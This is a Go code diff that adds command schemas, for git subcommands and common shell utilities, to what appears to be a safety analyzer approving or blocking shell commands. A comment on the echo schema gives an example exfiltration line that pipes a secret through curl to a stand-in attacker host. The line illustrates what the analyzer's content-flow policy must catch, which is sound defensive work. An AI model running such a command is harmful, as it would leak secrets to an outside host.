@@ -42,6 +42,9 @@ func DefaultRegistry() Registry {
 		bashSchema, renamed(bashSchema, "sh"),
 		xargsSchema, curlSchema,
 		gitSchema,
+		echoSchema, printfSchema, trueSchema, falseSchema, testSchema, renamed(testSchema, "["),
+		lsSchema, wcSchema, sortSchema, tailSchema, grepSchema, mkdirSchema,
+		exportSchema,
 	)
 }
 
@@ -372,9 +375,20 @@ var gitSchema = CommandSchema{
 	UnknownFlag:  UnknownFlagInsufficient,
 	EndOfOptions: true,
 	Subcommands: map[string]CommandSchema{
-		"status": gitStatusSchema,
-		"clean":  gitCleanSchema,
-		"push":   gitPushSchema,
+		"status":    gitStatusSchema,
+		"clean":     gitCleanSchema,
+		"push":      gitPushSchema,
+		"log":       gitLogSchema,
+		"show":      gitShowSchema,
+		"diff":      gitDiffSchema,
+		"rev-parse": gitRevParseSchema,
+		"rev-list":  gitRevListSchema,
+		"branch":    gitBranchSchema,
+		"worktree":  gitWorktreeSchema,
+		"config":    gitConfigSchema,
+		"add":       gitAddSchema,
+		"commit":    gitCommitSchema,
+		"rm":        gitRmSchema,
 	},
 }
 
@@ -483,6 +497,613 @@ var gitPushSchema = CommandSchema{
 	ImplicitEffects: []ImplicitEffect{
 		{Role: Remote("push"), Target: "<default-remote>", Dynamic: true, WhenNoPositionals: true},
 	},
+	Stdin:        StdinNever,
+	Stdout:       StdoutNone,
+	UnknownFlag:  UnknownFlagInsufficient,
+	EndOfOptions: true,
+}
+
+// gitLogSchema, gitShowSchema, gitDiffSchema, gitRevParseSchema,
+// gitRevListSchema: read-only history/plumbing queries, verified against
+// this host's git 2.54.0 (`git help log`/`show`/`diff`/`rev-parse`/
+// `rev-list`, man pages — `-h` alone only prints an abbreviated subset for
+// this family, so `git help <sub>` was used to confirm every flag below).
+//
+// Positionals are revisions, revision-ranges and pathspecs; modeling every
+// positional as Literal is imprecise for a PATHSPEC (`git show
+// HEAD:secrets.txt` genuinely reads file content), but parsing `REV:PATH`
+// colon syntax or a revision range is out of scope for this slice. Instead:
+// log/rev-parse/rev-list get an ALWAYS-on implicit PathRead of ".git"
+// (metadata — which refs/objects exist, not file content); show/diff get an
+// implicit PathRead of "." (content may flow through the diff/show output)
+// plus StdoutContent. This costs nothing today's policies would otherwise
+// catch (no golden case here targets a secret via colon syntax) and is
+// honestly documented rather than silently precise-looking.
+var gitLogSchema = CommandSchema{
+	Name:       "log",
+	Provenance: "git version 2.54.0, git help log",
+	Flags: map[string]FlagSpec{
+		"--oneline": inert,
+		"-n":        literal1, "--max-count": literal1,
+		"--stat":      inert,
+		"-p":          inert,
+		"--name-only": inert, "--name-status": inert,
+		"--format": literal1, "--pretty": literal1,
+		"--since": literal1, "--after": literal1,
+		"--until": literal1, "--before": literal1,
+		"--author": literal1,
+		"--grep":   literal1,
+		"-S":       literal1, "-G": literal1,
+		"--output": {Arity: ArityOne, Operand: PathTruncate},
+	},
+	Positionals: PositionalSpec{Rest: Literal},
+	ImplicitEffects: []ImplicitEffect{
+		{Role: PathRead, Target: ".git"},
+	},
+	Stdin:        StdinNever,
+	Stdout:       StdoutMetadata,
+	UnknownFlag:  UnknownFlagInsufficient,
+	EndOfOptions: true,
+}
+
+var gitShowSchema = CommandSchema{
+	Name:       "show",
+	Provenance: "git version 2.54.0, git help show",
+	Flags: map[string]FlagSpec{
+		"--format": literal1, "--pretty": literal1,
+		"--stat":      inert,
+		"-p":          inert,
+		"--name-only": inert, "--name-status": inert,
+		"--output": {Arity: ArityOne, Operand: PathTruncate},
+	},
+	Positionals: PositionalSpec{Rest: Literal},
+	ImplicitEffects: []ImplicitEffect{
+		{Role: PathRead, Target: "."},
+	},
+	Stdin:        StdinNever,
+	Stdout:       StdoutContent,
+	UnknownFlag:  UnknownFlagInsufficient,
+	EndOfOptions: true,
+}
+
+var gitDiffSchema = CommandSchema{
+	Name:       "diff",
+	Provenance: "git version 2.54.0, git help diff",
+	Flags: map[string]FlagSpec{
+		"--stat":      inert,
+		"-p":          inert,
+		"--name-only": inert, "--name-status": inert,
+		"--cached": inert, "--staged": inert,
+		"-S": literal1, "-G": literal1,
+		"--output": {Arity: ArityOne, Operand: PathTruncate},
+	},
+	Positionals: PositionalSpec{Rest: Literal},
+	ImplicitEffects: []ImplicitEffect{
+		{Role: PathRead, Target: "."},
+	},
+	Stdin:        StdinNever,
+	Stdout:       StdoutContent,
+	UnknownFlag:  UnknownFlagInsufficient,
+	EndOfOptions: true,
+}
+
+var gitRevParseSchema = CommandSchema{
+	Name:       "rev-parse",
+	Provenance: "git version 2.54.0, git help rev-parse",
+	Flags: map[string]FlagSpec{
+		"--abbrev-ref":    literalOpt,
+		"--short":         literalOpt,
+		"--show-toplevel": inert,
+		"--git-dir":       inert,
+		"--verify":        inert,
+	},
+	Positionals: PositionalSpec{Rest: Literal},
+	ImplicitEffects: []ImplicitEffect{
+		{Role: PathRead, Target: ".git"},
+	},
+	Stdin:        StdinNever,
+	Stdout:       StdoutMetadata,
+	UnknownFlag:  UnknownFlagInsufficient,
+	EndOfOptions: true,
+}
+
+var gitRevListSchema = CommandSchema{
+	Name:       "rev-list",
+	Provenance: "git version 2.54.0, git help rev-list",
+	Flags: map[string]FlagSpec{
+		"-n": literal1, "--max-count": literal1,
+		"--since": literal1, "--after": literal1,
+		"--until": literal1, "--before": literal1,
+		"--author": literal1,
+		"--grep":   literal1,
+	},
+	Positionals: PositionalSpec{Rest: Literal},
+	ImplicitEffects: []ImplicitEffect{
+		{Role: PathRead, Target: ".git"},
+	},
+	Stdin:        StdinNever,
+	Stdout:       StdoutMetadata,
+	UnknownFlag:  UnknownFlagInsufficient,
+	EndOfOptions: true,
+}
+
+// gitBranchSchema: THE VERDICT IS BY POSITIONAL SHAPE, NOT BY FLAG. Real
+// `git branch` overloads one verb across list/create/delete/rename/copy —
+// `--list`/`--contains`/`--merged`/etc. name a LIST filter (safe), while a
+// bare trailing positional CREATES a ref. Distinguishing "this positional is
+// safe because --list/--show-current was also given" would need a
+// conditional role (Rest role A under flag X, role B otherwise), which
+// PositionalSpec cannot express — Leading/TrailingSkippedByFlags only ever
+// REMOVE a role, never SWAP one in. Rather than add that generic capability
+// for one command, this schema takes the documented, safe fallback: EVERY
+// positional resolves to Unmodeled (KindUnmodeled — already fail-closed via
+// operand()'s existing default case, no new interpreter code), so `git
+// branch foo` and `git branch --list 'maint-*'` both abstain even though the
+// second is actually a safe, read-only listing filter. Over-abstaining a
+// safe listing filter is the accepted cost of not inventing a new generic
+// mechanism for one command's overload.
+//
+// `--contains`/`--merged`/`--no-merged`/`--format` all take their argument
+// as a FLAG VALUE, not a positional, so they do not interact with the
+// Unmodeled fallback at all. Deliberately left unmodeled (abstain, per the
+// brief): -d/-D/-m/-M/-c/-C/-u/--set-upstream-to/--unset-upstream/
+// --edit-description — every one of these mutates or targets a specific ref
+// by name in a way this schema does not model.
+var gitBranchSchema = CommandSchema{
+	Name:       "branch",
+	Provenance: "git version 2.54.0, git branch -h",
+	Flags: map[string]FlagSpec{
+		"-a": inert, "--all": inert,
+		"-r": inert, "--remotes": inert,
+		"-v": inert, "--verbose": inert,
+		"-l": inert, "--list": inert,
+		"--show-current": inert,
+		"--contains":     literal1,
+		"--merged":       literalOpt, "--no-merged": literalOpt,
+		"--format": literal1,
+	},
+	Positionals:  PositionalSpec{Rest: Unmodeled},
+	Stdin:        StdinNever,
+	Stdout:       StdoutMetadata,
+	UnknownFlag:  UnknownFlagInsufficient,
+	EndOfOptions: true,
+}
+
+// gitWorktreeListSchema/gitWorktreeSchema: `worktree` dispatches through a
+// SECOND, nested Subcommands map (interpretSubcommand recurses on the same
+// code path for any depth) — only `list` is modeled; `add`/`remove`/`prune`
+// are absent from the map entirely, so they hit interpretSubcommand's own
+// "unmodeled subcommand" failure with no new code. Flags verified against
+// this host's `git worktree -h` / `git worktree list -h`.
+var gitWorktreeListSchema = CommandSchema{
+	Name:       "list",
+	Provenance: "git version 2.54.0, git worktree list -h",
+	Flags: map[string]FlagSpec{
+		"-v": inert, "--verbose": inert,
+		"--porcelain": inert,
+		"-z":          inert,
+	},
+	Stdin:        StdinNever,
+	Stdout:       StdoutMetadata,
+	UnknownFlag:  UnknownFlagInsufficient,
+	EndOfOptions: true,
+}
+
+var gitWorktreeSchema = CommandSchema{
+	Name:         "worktree",
+	Provenance:   "git version 2.54.0, git worktree -h",
+	Flags:        map[string]FlagSpec{},
+	UnknownFlag:  UnknownFlagInsufficient,
+	EndOfOptions: true,
+	Subcommands: map[string]CommandSchema{
+		"list": gitWorktreeListSchema,
+	},
+}
+
+// gitConfigSchema: read forms only, via the SAME Unmodeled-positional
+// fallback gitBranchSchema uses. `--get`/`--get-all`/`--get-regexp` take the
+// config KEY as a FLAG VALUE (Literal — a key name is inert, not a path), so
+// `git config --get user.name` resolves ZERO positionals and is Sufficient.
+// A bare `git config NAME VALUE` (or any positional beyond a --get* flag's
+// own value) resolves to Unmodeled and abstains, per the brief: "ANY
+// positional beyond the key under `--get*` is a WRITE => unmodeled". Flags
+// verified against this host's `git config -h`.
+var gitConfigSchema = CommandSchema{
+	Name:       "config",
+	Provenance: "git version 2.54.0, git config -h",
+	Flags: map[string]FlagSpec{
+		"--get": literal1, "--get-all": literal1, "--get-regexp": literal1,
+		"-l": inert, "--list": inert,
+		"--show-origin": inert,
+	},
+	Positionals:  PositionalSpec{Rest: Unmodeled},
+	Stdin:        StdinNever,
+	Stdout:       StdoutMetadata,
+	UnknownFlag:  UnknownFlagInsufficient,
+	EndOfOptions: true,
+}
+
+// gitAddSchema: pathspecs are read (their content is what gets staged into
+// the index); staging always writes the index, so the implicit PathModify
+// of ".git" fires unconditionally (git add -A/-u with zero positionals still
+// writes it). -n/--dry-run is a real TransformDryRun, matching gitCleanSchema
+// and gitPushSchema's convention. Flags verified against this host's
+// `git add -h`.
+var gitAddSchema = CommandSchema{
+	Name:       "add",
+	Provenance: "git version 2.54.0, git add -h",
+	Flags: map[string]FlagSpec{
+		"-A": inert, "--all": inert,
+		"-u": inert, "--update": inert,
+		"-p": inert, "--patch": inert,
+		"-n": {Transform: EffectTransform{Kind: TransformDryRun}}, "--dry-run": {Transform: EffectTransform{Kind: TransformDryRun}},
+		"-v": inert, "--verbose": inert,
+		"-f": inert, "--force": inert,
+		"-N": inert, "--intent-to-add": inert,
+	},
+	Positionals: PositionalSpec{Rest: PathRead},
+	ImplicitEffects: []ImplicitEffect{
+		{Role: PathModify, Target: ".git"},
+	},
+	Stdin:        StdinNever,
+	Stdout:       StdoutNone,
+	UnknownFlag:  UnknownFlagInsufficient,
+	EndOfOptions: true,
+}
+
+// gitCommitSchema: `-m`/`--message` is the Message role; `-F`/`--file` reads
+// the message FROM a path. Positionals (pathspecs limiting which staged
+// changes are committed) are modeled PathRead for the same reason as
+// gitAddSchema's — reading is what determines what gets committed. The
+// implicit PathModify of ".git" fires unconditionally (a commit always
+// writes a new commit object and moves the branch ref). `-n`/`--no-verify`
+// is DELIBERATELY ABSENT from Flags (it skips pre-commit/commit-msg hooks, a
+// materially different trust boundary) so it triggers the generic
+// unknown-flag Insufficient path — Abstain, per the brief. `--verify`
+// (opposite of --no-verify, i.e. the SAFE default) is modeled inert. Flags
+// verified against this host's `git commit -h`.
+var gitCommitSchema = CommandSchema{
+	Name:       "commit",
+	Provenance: "git version 2.54.0, git commit -h",
+	Flags: map[string]FlagSpec{
+		"-m": {Arity: ArityOne, Operand: Message}, "--message": {Arity: ArityOne, Operand: Message},
+		"-a": inert, "--all": inert,
+		"-v": inert, "--verbose": inert,
+		"-q": inert, "--quiet": inert,
+		"--amend":   inert,
+		"--no-edit": inert,
+		"-s":        inert, "--signoff": inert,
+		"--allow-empty": inert,
+		"-F":            {Arity: ArityOne, Operand: PathRead}, "--file": {Arity: ArityOne, Operand: PathRead},
+		"--author": literal1,
+		"--verify": inert,
+	},
+	Positionals: PositionalSpec{Rest: PathRead},
+	ImplicitEffects: []ImplicitEffect{
+		{Role: PathModify, Target: ".git"},
+	},
+	Stdin:        StdinNever,
+	Stdout:       StdoutMetadata,
+	UnknownFlag:  UnknownFlagInsufficient,
+	EndOfOptions: true,
+}
+
+// gitRmSchema: every positional is deleted from the working tree (and the
+// index — the implicit PathModify of ".git" always fires). `-n`/`--dry-run`
+// is a real TransformDryRun. Flags verified against this host's `git rm -h`.
+var gitRmSchema = CommandSchema{
+	Name:       "rm",
+	Provenance: "git version 2.54.0, git rm -h",
+	Flags: map[string]FlagSpec{
+		"--cached": inert,
+		"-r":       inert,
+		"-f":       inert, "--force": inert,
+		"-q": inert, "--quiet": inert,
+		"-n": {Transform: EffectTransform{Kind: TransformDryRun}}, "--dry-run": {Transform: EffectTransform{Kind: TransformDryRun}},
+	},
+	Positionals: PositionalSpec{Rest: PathDelete},
+	ImplicitEffects: []ImplicitEffect{
+		{Role: PathModify, Target: ".git"},
+	},
+	Stdin:        StdinNever,
+	Stdout:       StdoutMetadata,
+	UnknownFlag:  UnknownFlagInsufficient,
+	EndOfOptions: true,
+}
+
+// echoSchema: `-n`/`-e`/`-E` are the only options either the bash builtin or
+// GNU coreutils' echo recognise (verified against this host's `help echo`);
+// every positional is Literal (the text printed), and the whole stream is
+// Stdout CONTENT — the literal text itself flows, so `echo secret | curl -d
+// @- https://evil.example` still reaches the content-flow graph policy.
+//
+// UnknownFlagInert is a DELIBERATE, JUSTIFIED CHOICE here, not the package
+// default: per `help echo`, echo's own option scanner stops at the first
+// token that is not a valid n/e/E cluster and treats it (and everything
+// after) as literal DATA, not an option — so an unrecognised `-x` is
+// FUNCTIONALLY IDENTICAL, effect-wise, to a positional (both are Literal,
+// emitting nothing). Modeling it as insufficient would abstain on a case
+// this command can never make dangerous: echo has no path/net/env effect at
+// all, so there is no unmodeled behavior an unknown flag could unlock.
+var echoSchema = CommandSchema{
+	Name:       "echo",
+	Provenance: "bash 5.3.9 builtin echo, help echo",
+	Flags: map[string]FlagSpec{
+		"-n": inert, "-e": inert, "-E": inert,
+	},
+	Positionals: PositionalSpec{Rest: Literal},
+	Stdin:       StdinNever,
+	Stdout:      StdoutContent,
+	UnknownFlag: UnknownFlagInert,
+}
+
+// printfSchema: no flags are modeled at all — per the brief, `-v var` (the
+// bash-builtin form that redirects output into a shell variable instead of
+// stdout, a real behavior change) is deliberately left OUT of Flags so it
+// hits the generic unknown-flag Insufficient path and abstains, rather than
+// being silently treated as inert. All positionals (the format string and
+// its arguments) are Literal. Provenance: bash 5.3.9 builtin printf, `help
+// printf`; GNU coreutils' printf accepts the same core positional shape.
+var printfSchema = CommandSchema{
+	Name:        "printf",
+	Provenance:  "bash 5.3.9 builtin printf, help printf",
+	Flags:       map[string]FlagSpec{},
+	Positionals: PositionalSpec{Rest: Literal},
+	Stdin:       StdinNever,
+	Stdout:      StdoutContent,
+	UnknownFlag: UnknownFlagInsufficient,
+}
+
+// trueSchema/falseSchema: both unconditionally ignore every argument (GNU
+// coreutils and the bash builtins alike) — no flag or positional can ever
+// change their behavior, so UnknownFlagInert plus an all-Literal Positionals
+// spec is not a relaxation, it is an ACCURATE model: every possible
+// invocation has the same zero effects. A consequence, noted rather than
+// worked around: neither schema has ANY path to Abstain (nothing here ever
+// calls fail()), so their golden coverage is Approve-only by design, not a
+// coverage gap.
+var trueSchema = CommandSchema{
+	Name:        "true",
+	Provenance:  "true (GNU coreutils) 9.11 / bash 5.3.9 builtin true — ignores all arguments unconditionally",
+	Flags:       map[string]FlagSpec{},
+	Positionals: PositionalSpec{Rest: Literal},
+	Stdin:       StdinNever,
+	Stdout:      StdoutNone,
+	UnknownFlag: UnknownFlagInert,
+}
+
+var falseSchema = CommandSchema{
+	Name:        "false",
+	Provenance:  "false (GNU coreutils) 9.11 / bash 5.3.9 builtin false — ignores all arguments unconditionally",
+	Flags:       map[string]FlagSpec{},
+	Positionals: PositionalSpec{Rest: Literal},
+	Stdin:       StdinNever,
+	Stdout:      StdoutNone,
+	UnknownFlag: UnknownFlagInert,
+}
+
+// testSchema (also registered as "["): NO operator is modeled — per the
+// brief, "positionals Literal, no flags" — so this is the default
+// UnknownFlagInsufficient, unlike true/false: a bare string/numeric
+// comparison with no `-`-prefixed operator (`[ "$a" = "$b" ]`) is Sufficient
+// (every token is a Literal positional, `[`'s trailing `]` included), but
+// ANY of test's real operators (`-f`, `-n`, `-eq`, …) hits the generic
+// unknown-flag path and Abstains — a real over-approximation for common,
+// genuinely-safe idioms like `[ -n "$x" ]`, accepted deliberately rather
+// than modeling test's operator vocabulary (none of it produces a
+// filesystem/network/env effect this slice's Effect vocabulary would even
+// have anywhere to record, so modeling it would only ever relax Abstain to
+// Approve, never add a real check). Registered a second time as "[" via
+// renamed(), mirroring sh's registration alongside bash.
+var testSchema = CommandSchema{
+	Name:        "test",
+	Provenance:  "test (GNU coreutils) 9.11 / bash 5.3.9 builtin test — every operator is a pure comparison, no filesystem mutation or content read",
+	Flags:       map[string]FlagSpec{},
+	Positionals: PositionalSpec{Rest: Literal},
+	Stdin:       StdinNever,
+	Stdout:      StdoutNone,
+}
+
+// lsSchema: PathRead is METADATA (a directory listing), not content —
+// Stdout is StdoutMetadata to match. An implicit PathRead of "." fires only
+// when no positional was given (ls's own default). Flags verified against
+// this host's `ls --help`.
+var lsSchema = CommandSchema{
+	Name:       "ls",
+	Provenance: "ls (GNU coreutils) 9.11, ls --help",
+	Flags: map[string]FlagSpec{
+		"-l": inert,
+		"-a": inert, "--all": inert,
+		"-A": inert, "--almost-all": inert,
+		"-h": inert, "--human-readable": inert,
+		"-R": inert, "--recursive": inert,
+		"-t": inert,
+		"-r": inert, "--reverse": inert,
+		"-S": inert,
+		"-1": inert,
+		"-d": inert, "--directory": inert,
+		"-F": inert, "--classify": literalOpt,
+		"-G": inert, "--no-group": inert,
+		"--color": literalOpt,
+	},
+	Positionals: PositionalSpec{Rest: PathRead},
+	ImplicitEffects: []ImplicitEffect{
+		{Role: PathRead, Target: ".", WhenNoPositionals: true},
+	},
+	Stdin:        StdinNever,
+	Stdout:       StdoutMetadata,
+	UnknownFlag:  UnknownFlagInsufficient,
+	EndOfOptions: true,
+}
+
+// wcSchema: every flag just selects which COUNT to print — none change what
+// is read. Flags verified against this host's `wc --help`.
+var wcSchema = CommandSchema{
+	Name:       "wc",
+	Provenance: "wc (GNU coreutils) 9.11, wc --help",
+	Flags: map[string]FlagSpec{
+		"-l": inert, "--lines": inert,
+		"-w": inert, "--words": inert,
+		"-c": inert, "--bytes": inert,
+		"-m": inert, "--chars": inert,
+		"-L": inert, "--max-line-length": inert,
+	},
+	Positionals:  PositionalSpec{Rest: PathRead, StdinToken: "-"},
+	Stdin:        StdinWhenNoPathOperands,
+	Stdout:       StdoutMetadata,
+	UnknownFlag:  UnknownFlagInsufficient,
+	EndOfOptions: true,
+}
+
+// sortSchema: `-o FILE`/`--output=FILE` truncates and rewrites a file (it
+// may even be the SAME file as an input operand — sort reads it fully
+// before writing); every other modeled flag only changes ORDERING. Flags
+// verified against this host's `sort --help`.
+var sortSchema = CommandSchema{
+	Name:       "sort",
+	Provenance: "sort (GNU coreutils) 9.11, sort --help",
+	Flags: map[string]FlagSpec{
+		"-r": inert, "--reverse": inert,
+		"-n": inert, "--numeric-sort": inert,
+		"-u": inert, "--unique": inert,
+		"-f": inert, "--ignore-case": inert,
+		"-k": literal1, "--key": literal1,
+		"-t": literal1, "--field-separator": literal1,
+		"-s": inert, "--stable": inert,
+		"-h": inert, "--human-numeric-sort": inert,
+		"-V": inert, "--version-sort": inert,
+		"-z": inert, "--zero-terminated": inert,
+		"-o": {Arity: ArityOne, Operand: PathTruncate}, "--output": {Arity: ArityOne, Operand: PathTruncate},
+	},
+	Positionals:  PositionalSpec{Rest: PathRead, StdinToken: "-"},
+	Stdin:        StdinWhenNoPathOperands,
+	Stdout:       StdoutContent,
+	UnknownFlag:  UnknownFlagInsufficient,
+	EndOfOptions: true,
+}
+
+// tailSchema: `-f`/`-F`/`--follow` just keeps reading the same file(s) as
+// they grow; `--pid` is the one glued value spelling worth modeling
+// (literal). Flags verified against this host's `tail --help`.
+var tailSchema = CommandSchema{
+	Name:       "tail",
+	Provenance: "tail (GNU coreutils) 9.11, tail --help",
+	Flags: map[string]FlagSpec{
+		"-n": literal1, "--lines": literal1,
+		"-c": literal1, "--bytes": literal1,
+		"-f": inert, "-F": inert, "--follow": literalOpt,
+		"--pid": literal1,
+		"-q":    inert, "--quiet": inert, "--silent": inert,
+		"-v": inert, "--verbose": inert,
+		"-z": inert, "--zero-terminated": inert,
+	},
+	Positionals:  PositionalSpec{Rest: PathRead, StdinToken: "-"},
+	Stdin:        StdinWhenNoPathOperands,
+	Stdout:       StdoutContent,
+	UnknownFlag:  UnknownFlagInsufficient,
+	EndOfOptions: true,
+}
+
+// grepSchema: this host's `grep` is ugrep (a GNU-grep-compatible CLI,
+// verified spelling-by-spelling against `grep --help`), not GNU grep itself
+// — Provenance says so honestly. The pattern is a Leading Literal positional
+// skipped by -e/--regexp/-f/--file (mirroring sedSchema's program-operand
+// shape); the rest are PathRead. `-f`/`--file` reads a PATTERNS file
+// (PathRead — a real read, not a data flag). The implicit recursive-from-"."
+// read only fires under -r/-R AND when the invocation resolved zero
+// positionals at all — which, because the Leading pattern slot always
+// consumes one positional unless -e/-f supplied it, means `grep -r TODO`
+// (pattern given positionally) does NOT trigger it, only `grep -r -e TODO`
+// does. This is the WhenFlags condition's documented imprecision (see
+// ImplicitEffect's doc comment) — a bare positional pattern with -r produces
+// no path effect at all (grep still reads stdin per StdinWhenNoPathOperands,
+// which is not itself dangerous) rather than the honest "reads everything
+// under .".
+var grepSchema = CommandSchema{
+	Name:       "grep",
+	Provenance: "ugrep 7.8.4 (GNU-grep-compatible CLI), grep --help",
+	Flags: map[string]FlagSpec{
+		"-i": inert, "--ignore-case": inert,
+		"-v": inert, "--invert-match": inert,
+		"-n": inert, "--line-number": inert,
+		"-c": inert, "--count": inert,
+		"-l": inert, "--files-with-matches": inert,
+		"-L": inert, "--files-without-match": inert,
+		"-h": inert, "--no-filename": inert,
+		"-H": inert, "--with-filename": inert,
+		"-o": inert, "--only-matching": inert,
+		"-q": inert, "--quiet": inert, "--silent": inert,
+		"-s": inert, "--no-messages": inert,
+		"-w": inert, "--word-regexp": inert,
+		"-x": inert, "--line-regexp": inert,
+		"-E": inert, "--extended-regexp": inert,
+		"-F": inert, "--fixed-strings": inert,
+		"-G": inert, "--basic-regexp": inert,
+		"-P": inert, "--perl-regexp": inert,
+		"-r": inert, "--recursive": inert,
+		"-R": inert, "--dereference-recursive": inert,
+		"-a": inert, "--text": inert,
+		"-z": inert, "--decompress": inert,
+		"--color": literalOpt, "--colour": literalOpt,
+		"-A": literal1, "--after-context": literal1,
+		"-B": literal1, "--before-context": literal1,
+		"-C": literal1, "--context": literal1,
+		"-m": literal1, "--min-count": literal1, "--max-count": literal1,
+		"--include": literal1, "--exclude": literal1, "--exclude-dir": literal1,
+		"-e": literal1, "--regexp": literal1,
+		"-f": {Arity: ArityOne, Operand: PathRead}, "--file": {Arity: ArityOne, Operand: PathRead},
+	},
+	Positionals: PositionalSpec{
+		Leading:               []OperandRole{Literal},
+		LeadingSkippedByFlags: []string{"-e", "--regexp", "-f", "--file"},
+		Rest:                  PathRead,
+	},
+	ImplicitEffects: []ImplicitEffect{
+		{Role: PathRead, Target: ".", WhenNoPositionals: true, WhenFlags: []string{"-r", "-R", "--recursive", "--dereference-recursive"}},
+	},
+	Stdin:        StdinWhenNoPathOperands,
+	Stdout:       StdoutContent,
+	UnknownFlag:  UnknownFlagInsufficient,
+	EndOfOptions: true,
+}
+
+// mkdirSchema: `-m MODE` is a permission bits string, inert to the effect
+// model. Flags verified against this host's `mkdir --help`.
+var mkdirSchema = CommandSchema{
+	Name:       "mkdir",
+	Provenance: "mkdir (GNU coreutils) 9.11, mkdir --help",
+	Flags: map[string]FlagSpec{
+		"-p": inert, "--parents": inert,
+		"-v": inert, "--verbose": inert,
+		"-m": literal1, "--mode": literal1,
+	},
+	Positionals:  PositionalSpec{Rest: PathCreate},
+	Stdin:        StdinNever,
+	Stdout:       StdoutNone,
+	UnknownFlag:  UnknownFlagInsufficient,
+	EndOfOptions: true,
+}
+
+// exportSchema: each positional is an env assignment (KindEnvAssign) — a
+// `NAME=VALUE` token, or a bare `NAME` marking an already-set shell variable
+// exported. `-n` (unexport) and `-p` (list) are modeled inert; `-n`'s
+// positional is still routed through the same EnvAssign role even though
+// its real effect is an UNexport, not a set — a documented imprecision,
+// harmless today because DefaultPolicies has no policy that judges
+// EffectEnv at all (see judgeNode: an effect no policy applies to falls
+// through to the default MarkPermitted, exactly like an effect kind no
+// policy has ever heard of). `-f` (refer to shell FUNCTIONS, not variables —
+// a materially different form) is deliberately absent from Flags so it hits
+// the generic unknown-flag Insufficient path and abstains. Verified against
+// this host's `help export`.
+var exportSchema = CommandSchema{
+	Name:       "export",
+	Provenance: "bash 5.3.9 builtin export, help export",
+	Flags: map[string]FlagSpec{
+		"-n": inert,
+		"-p": inert,
+	},
+	Positionals:  PositionalSpec{Rest: EnvAssign},
 	Stdin:        StdinNever,
 	Stdout:       StdoutNone,
 	UnknownFlag:  UnknownFlagInsufficient,
